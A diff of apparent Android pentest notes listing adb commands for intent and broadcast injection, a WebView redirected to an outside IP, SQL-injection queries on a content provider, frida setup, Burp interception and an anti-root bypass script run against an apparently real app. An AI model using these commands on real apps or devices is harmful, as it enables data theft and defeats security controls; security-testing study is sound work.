@@ -1,6 +1,10 @@
 adb shell am start -n com.example.intentinjection/.Dashboard -e username 'hacker'
 adb shell am broadcast -p com.example.insecurebroadcastreceiver -a theBroadcast -e mobile '000' -e password "123456"
 
+
+
+
+
 adb shell am start -n com.example.insecurewebview/.RegistrationWebView -e reg_url 'http://138.68.182.36:999/'
 
 
@@ -54,3 +58,55 @@ content query --uri content://com.example.insecurecontentprovider.DataUserConten
 content query --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/ --projection  "'"
 content query --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/ --projection  "* from sqlite_master --"
 content insert --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/  --bind name:s:"x2" 
+
+
+
+brew install jadx
+
+pip3 install frida-tools
+pip3 install frida
+frida –version
+
+download frida-server-15.1.15-android-x86.xz https://github.com/frida/frida/releases
+unzip 
+adb root 
+adb push frida-server /data/local/tmp/
+adb shell "chmod 755 /data/local/tmp/frida-server"
+adb shell "/data/local/tmp/frida-server &"
+
+frida-ps -U #List packages and processes
+frida-ps -U | grep -i <part_of_the_package_name> 
+
+
+frida -l code.js -f com.example.frida1 -U
+%resume
+
+
+
+
+adb shell
+settings
+settings put global http_proxy 192.168.59.1:8080
+settings get global http_proxy
+
+in android open : http://burp -> download ca -> der ->  rename name.cer
+
+for disable : settings put global http_proxy :0
+
+
+
+
+adb logcat "packages_name"
+
+
+https://codeshare.frida.re/
+
+https://codeshare.frida.re/@dzonerzy/fridantiroot/
+
+
+
+frida --codeshare dzonerzy/fridantiroot -f com.sadadpsp.eva -U
+
+%resume
+
+frida -l file.js -f com.sadadpsp.eva -U
